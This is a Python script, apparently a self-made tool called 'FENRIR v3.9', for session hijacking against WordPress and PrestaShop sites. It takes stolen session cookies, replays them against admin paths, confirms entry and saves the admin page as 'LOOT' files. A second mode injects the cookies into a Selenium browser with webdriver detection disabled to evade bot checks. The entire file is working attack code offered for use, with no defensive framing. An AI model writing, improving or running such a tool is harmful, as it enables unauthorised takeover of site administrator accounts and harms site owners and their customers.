import asyncio
import aiohttp
import sys
import re
import time
import logging
import os
import shutil
from dataclasses import dataclass
from typing import Optional, Dict
from enum import Enum, auto
from yarl import URL

# ==============================================================================
#  🛠️ DEPENDENCIAS EXTERNAS (SOFT LOADER)
# ==============================================================================
SELENIUM_AVAILABLE = False
try:
    from selenium import webdriver
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.firefox.service import Service as FirefoxService
    from webdriver_manager.firefox import GeckoDriverManager
    SELENIUM_AVAILABLE = True
except ImportError:
    pass

# ==============================================================================
#  🛠️ CONFIGURACIÓN & UTILS
# ==============================================================================

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s", datefmt="%H:%M:%S")

class Colors:
    # AHORA SÍ ESTÁ DEFINIDO EL MAGENTA
    RED, GREEN, YELLOW, CYAN, MAGENTA, RESET, BOLD = "\033[91m", "\033[92m", "\033[93m", "\033[96m", "\033[95m", "\033[0m", "\033[1m"

def colorize(text: str, color: str) -> str: return f"{color}{text}{Colors.RESET}"

class TargetType(Enum):
    WORDPRESS = auto()
    PRESTASHOP = auto()

@dataclass
class TargetConfig:
    base_url: str
    type: TargetType
    user_agent: str
    timeout: int = 20

# ==============================================================================
#  👻 GHOST BROWSER (UBUNTU SNAP FIX)
# ==============================================================================

class GhostBrowser:
    def __init__(self, config: TargetConfig):
        self.config = config

    def launch(self, raw_cookie: str, target_path: str):
        if not SELENIUM_AVAILABLE:
            print(colorize("❌ Error: Selenium no está instalado.", Colors.RED))
            print("   Ejecuta: pip install selenium webdriver-manager")
            return

        print(colorize("\n   👻 Invocando navegador fantasma...", Colors.CYAN))
        
        # --- FIX CRÍTICO PARA UBUNTU/SNAP ---
        # Creamos una carpeta temporal local para que el Firefox Snap pueda leerla
        local_tmp = os.path.join(os.getcwd(), "selenium_temp")
        if not os.path.exists(local_tmp):
            os.makedirs(local_tmp)
        # Forzamos a Python a usar esta carpeta en vez de /tmp/ del sistema
        os.environ["TMPDIR"] = local_tmp
        
        # Parseo de cookies
        cookies_dict = {}
        try:
            raw_cookie = raw_cookie.strip().replace("Cookie: ", "")
            parts = raw_cookie.split(";")
            for part in parts:
                if "=" in part:
                    key, value = part.strip().split("=", 1)
                    cookies_dict[key] = value
        except Exception as e:
            print(colorize(f"❌ Error parseando cookies: {e}", Colors.RED))
            return

        driver = None
        try:
            options = FirefoxOptions()
            options.set_preference("general.useragent.override", self.config.user_agent)
            
            # Anti-bot básico
            options.set_preference("dom.webdriver.enabled", False)
            options.set_preference('useAutomationExtension', False)
            
            print(colorize("   📥 Preparando driver...", Colors.YELLOW))
            service = FirefoxService(GeckoDriverManager().install())
            driver = webdriver.Firefox(service=service, options=options)
            
        except Exception as e:
            print(colorize(f"   ❌ Error iniciando navegador: {e}", Colors.RED))
            print("   (Si usas Ubuntu, asegúrate de tener Firefox instalado normalmente)")
            return

        try:
            print("   🌍 Navegando al dominio...")
            driver.get(self.config.base_url)
            
            print(colorize("   💉 Inyectando sesión...", Colors.YELLOW))
            for name, value in cookies_dict.items():
                driver.add_cookie({
                    'name': name,
                    'value': value,
                    'path': '/',
                    'secure': True 
                })
            
            final_url = f"{self.config.base_url.rstrip('/')}/{target_path.lstrip('/')}"
            print(f"   🚀 Redirigiendo a: {final_url}")
            driver.get(final_url)
            
            print(colorize("\n   ✅ NAVEGADOR ABIERTO. La puerta está abierta.", Colors.GREEN))
            print(colorize("   ⚠️  NOTA: Si ves 'Página no encontrada' pero tienes la barra negra arriba, ¡ESTÁS DENTRO!", Colors.MAGENTA))
            input("   [Presiona Enter en esta terminal para cerrar el navegador] ")
            
        except Exception as e:
            print(colorize(f"   ❌ Error durante la sesión: {e}", Colors.RED))
        finally:
            if driver:
                driver.quit()
            # Limpieza
            if os.path.exists(local_tmp):
                try: shutil.rmtree(local_tmp)
                except: pass

# ==============================================================================
#  🦍 FENRIR ENGINE (AIOHTTP CLÁSICO)
# ==============================================================================

class FenrirEngine:
    def __init__(self, config: TargetConfig):
        self.config = config
        self.session: Optional[aiohttp.ClientSession] = None

    async def __aenter__(self):
        jar = aiohttp.CookieJar(unsafe=True)
        self.session = aiohttp.ClientSession(
            base_url=self.config.base_url,
            connector=aiohttp.TCPConnector(ssl=False),
            cookie_jar=jar,
            headers={"User-Agent": self.config.user_agent},
            timeout=aiohttp.ClientTimeout(total=self.config.timeout)
        )
        return self

    async def __aexit__(self, *args):
        if self.session: await self.session.close()

    def inject_raw_cookie(self, raw_cookie: str):
        if not self.session: return
        print(colorize("\n💉 Inyectando Cookies a la fuerza...", Colors.YELLOW))
        try:
            url_obj = URL(self.config.base_url)
            raw_cookie = raw_cookie.strip().replace("Cookie: ", "")
            parts = raw_cookie.split(";")
            loaded_cookies = []

            for part in parts:
                if "=" in part:
                    key, value = part.strip().split("=", 1)
                    self.session.cookie_jar.update_cookies({key: value}, response_url=url_obj)
                    loaded_cookies.append(key)
            
            if loaded_cookies:
                print(colorize(f"✅ Cookies cargadas: {loaded_cookies}", Colors.GREEN))
            else:
                print(colorize("❌ ERROR: No se detectó formato Nombre=Valor.", Colors.RED))

        except Exception as e:
            print(colorize(f"❌ Error crítico: {e}", Colors.RED))

    async def check_target(self, path: str):
        if not self.session: return
        try:
            print(f"\n⏳ Atacando objetivo: {colorize(path, Colors.BOLD)} ...")
            
            async with self.session.get(path, allow_redirects=True) as resp:
                content = await resp.text()
                title_match = re.search('<title>(.*?)</title>', content, re.IGNORECASE)
                title = title_match.group(1).strip() if title_match else "Sin Título"
                
                real_url = str(resp.url)
                status = resp.status
                
                print(f"   [{status}] URL Final: {real_url}")
                print(f"   📄 Título: {title[:60]}...")

                is_success = False
                
                if self.config.type == TargetType.PRESTASHOP:
                    if "login" not in real_url.lower() and any(k in content for k in ["logout", "employee_box", "PrestaShop", "Avatar", "class=\"bootstrap\""]):
                         is_success = True
                    elif "login" in real_url.lower() and "AdminLogin" not in path:
                         print(colorize("❌ REBOTE: El servidor te mandó al Login.", Colors.RED))

                elif self.config.type == TargetType.WORDPRESS:
                    if "wp-login.php" not in real_url and ("wp-admin" in real_url or "wp-admin-bar" in content):
                        is_success = True
                    elif "wp-login.php" in real_url:
                         print(colorize("❌ REBOTE: El servidor te mandó al Login.", Colors.RED))

                if is_success:
                     print(f"\n   {colorize('🔥 ¡DENTRO! ACCESO CONFIRMADO 🔥', Colors.GREEN)}")
                     filename = f"LOOT_{int(time.time())}.html"
                     with open(filename, "w", encoding="utf-8") as f: f.write(content)
                     print(f"   💾 Evidencia guardada en: {filename}")
                else:
                     if not "REBOTE" in title: 
                        print(colorize("⚠️  Sin acceso claro (Revisa el HTML).", Colors.YELLOW))

        except Exception as e: print(f"❌ Error de conexión: {e}")

# ==============================================================================
#  🎮 INTERFAZ PRINCIPAL
# ==============================================================================

async def main():
    print(colorize("\n🦍 FENRIR v3.9 - UBUNTU EDITION 🦍\n", Colors.RED))

    # 1. URL
    url_input = input(">> URL Base (Raíz): ").strip()
    if not url_input.startswith("http"): url_input = f"http://{url_input}"
    if not url_input.endswith("/"): url_input += "/"
    
    # 2. TECNOLOGÍA
    print("\n[1] WordPress")
    print("[2] PrestaShop")
    choice = input(">> Opción: ").strip()
    target_type = TargetType.WORDPRESS if choice == '1' else TargetType.PRESTASHOP

    # 3. COOKIE
    final_cookie_string = ""
    print(f"\n{Colors.YELLOW}👉 INYECCIÓN DE COOKIES{Colors.RESET}")
    
    if target_type == TargetType.PRESTASHOP:
        print("   [1] PHPSESSID:")
        phpsessid = input("   >> ").strip()
        print("   [2] PrestaShop Cookie:")
        auth = input("   >> ").strip()
        prefix = f"PHPSESSID={phpsessid}" if "=" not in phpsessid else phpsessid
        final_cookie_string = f"{prefix}; {auth}"
    else: 
        print("   Pega la cookie completa:")
        final_cookie_string = input("   >> ").strip()

    # 4. USER AGENT
    print(f"\n{Colors.CYAN}🎭 CAMUFLAJE{Colors.RESET}")
    print("   [Enter] para Firefox Linux.")
    ua_input = input(">> User-Agent: ").strip()
    if not ua_input: ua_input = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"

    # 5. RUTA
    print(f"\n{Colors.GREEN}🎯 OBJETIVO{Colors.RESET}")
    default_path = "/Backoffice" if target_type == TargetType.PRESTASHOP else "/wp-admin/"
    print(f"   [Enter] para: {default_path}")
    path_input = input(">> Ruta: ").strip()
    if not path_input: path_input = default_path
    
    # Fix para rutas relativas
    if path_input.startswith("http"):
        path_input = URL(path_input).path
    if not path_input.startswith("/"): path_input = f"/{path_input}"

    # 6. MODO DE EJECUCIÓN
    print(f"\n{Colors.MAGENTA}⚔️  MODO DE ATAQUE{Colors.RESET}")
    print("   [1] Check Rápido (Consola)")
    print("   [2] Abrir Navegador (Selenium)")
    mode = input("   >> ").strip()

    config = TargetConfig(base_url=url_input, type=target_type, user_agent=ua_input)

    if mode == '2':
        ghost = GhostBrowser(config)
        ghost.launch(final_cookie_string, path_input)
    else:
        async with FenrirEngine(config) as engine:
            engine.inject_raw_cookie(final_cookie_string)
            await engine.check_target(path_input)

if __name__ == "__main__":
    if sys.platform == 'win32': asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass